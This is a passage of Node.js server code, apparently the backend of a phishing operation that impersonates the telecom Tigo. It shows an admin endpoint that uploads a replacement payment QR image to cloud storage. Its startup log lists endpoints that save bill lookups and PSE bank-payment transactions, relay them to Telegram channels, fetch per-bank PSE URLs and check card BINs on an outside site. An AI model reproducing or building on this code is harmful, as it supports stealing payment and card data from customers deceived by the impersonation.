    // Endpoint: Subir QR a R2 (MasterPanel)
    if (req.url === '/api/subir-qr' && req.method === 'POST') {
        // Validar token
        const authHeader = req.headers.authorization || '';
        const token = authHeader.replace('Bearer ', '');

        if (!token || !validarTokenAdmin(token)) {
            res.writeHead(401, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ ok: false, error: 'No autorizado' }));
            return;
        }

        const bb = Busboy({ headers: req.headers });
        let uploadError = null;
        let filename = '';

        bb.on('file', (fieldname, file, info) => {
            if (fieldname !== 'qrFile') {
                file.resume();
                return;
            }

            const { filename: originalFilename, encoding, mimeType } = info;

            // Validar tipo de archivo
            if (!['image/png', 'image/jpeg'].includes(mimeType)) {
                uploadError = 'Solo se permiten PNG o JPG';
                file.resume();
                return;
            }

            // Generar nombre único para el archivo
            const ext = originalFilename.includes('.png') ? '.png' : '.jpg';
            filename = `qr-bre-${Date.now()}${ext}`;

            // Leer archivo en memoria
            const chunks = [];
            file.on('data', chunk => {
                chunks.push(chunk);
            });

            file.on('end', () => {
                if (uploadError) return;

                const buffer = Buffer.concat(chunks);

                // Subir a R2
                s3.putObject(
                    {
                        Bucket: BUCKET,
                        Key: 'assets/logos/' + filename,
                        Body: buffer,
                        ContentType: mimeType
                    },
                    (errPut) => {
                        if (errPut) {
                            res.writeHead(500);
                            res.end(JSON.stringify({ ok: false, error: 'Error subiendo QR a R2' }));
                        } else {
                            // Actualizar configuración con nuevo filename
                            s3.getObject({ Bucket: BUCKET, Key: 'configuracion.json' }, (errGet, data) => {
                                let config = {};
                                if (!errGet && data.Body) {
                                    try {
                                        config = JSON.parse(data.Body.toString());
                                    } catch (e) {}
                                }

                                config.qrImageFile = filename;

                                s3.putObject(
                                    {
                                        Bucket: BUCKET,
                                        Key: 'configuracion.json',
                                        Body: JSON.stringify(config, null, 2)
                                    },
                                    (errPutConfig) => {
                                        if (errPutConfig) {
                                            res.writeHead(500);
                                            res.end(JSON.stringify({ ok: false, error: 'Error actualizando configuración' }));
                                        } else {
                                            res.writeHead(200);
                                            res.end(JSON.stringify({ ok: true, filename: filename }));
                                        }
                                    }
                                );
                            });
                        }
                    }
                );
            });
        });

        bb.on('error', (error) => {
            if (!uploadError) {
                uploadError = error.message;
            }
        });

        bb.on('close', () => {
            if (uploadError) {
                res.writeHead(400);
                res.end(JSON.stringify({ ok: false, error: uploadError }));
            }
        });

        req.pipe(bb);
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ ok: false, error: 'Endpoint no encontrado' }));
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 Servidor TIGO API corriendo en http://localhost:${PORT}`);
    console.log(`📍 Endpoints:`);
    console.log(`   POST /api/consultar-factura (consulta API + genera txid + guarda R2 + telegram tigoconsulta)`);
    console.log(`   POST /api/guardar-transaccion (guarda en R2 + telegram tigoconsulta)`);
    console.log(`   GET  /api/transaccion/{txid} (recupera desde R2)`);
    console.log(`   POST /api/guardar-pse-transaccion (guarda PSE + telegram tigopagos)`);
    console.log(`   GET  /api/pse-urls (obtiene URLs de PSE por banco)`);
    console.log(`   POST /api/bin-check (verifica BIN en laboratorio.lol)\n`);
});
